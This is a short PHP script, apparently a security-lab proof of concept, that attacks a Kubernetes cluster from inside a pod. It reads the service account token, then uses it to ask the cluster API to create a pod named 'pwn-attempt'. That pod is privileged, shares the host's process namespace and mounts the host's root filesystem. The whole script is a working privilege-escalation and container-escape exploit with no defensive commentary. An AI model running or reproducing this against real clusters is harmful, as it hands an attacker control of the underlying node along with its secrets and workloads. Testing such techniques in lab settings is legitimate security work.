<?php
$token = file_get_contents("/var/run/secrets/kubernetes.io/serviceaccount/token");
$podSpec = json_encode([
  "apiVersion"=>"v1","kind"=>"Pod",
  "metadata"=>["name"=>"pwn-attempt","namespace"=>"security-lab"],
  "spec"=>["hostPID"=>true,"containers"=>[[
    "name"=>"pwn","image"=>"alpine","command"=>["sleep","3600"],
    "securityContext"=>["privileged"=>true],
    "volumeMounts"=>[["name"=>"host","mountPath"=>"/host"]]
  ]],"volumes"=>[["name"=>"host","hostPath"=>["path"=>"/"]]]]
]);
$opts = ["http"=>["method"=>"POST",
  "header"=>"Authorization: Bearer $token\r\nContent-Type: application/json\r\n",
  "content"=>$podSpec,"ignore_errors"=>true],
  "ssl"=>["cafile"=>"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt","verify_peer"=>true,"verify_peer_name"=>true]];
$context = stream_context_create($opts);
$result = @file_get_contents("https://kubernetes.default.svc/api/v1/namespaces/security-lab/pods", false, $context);
echo $http_response_header[0] . "\n";
echo $result . "\n";
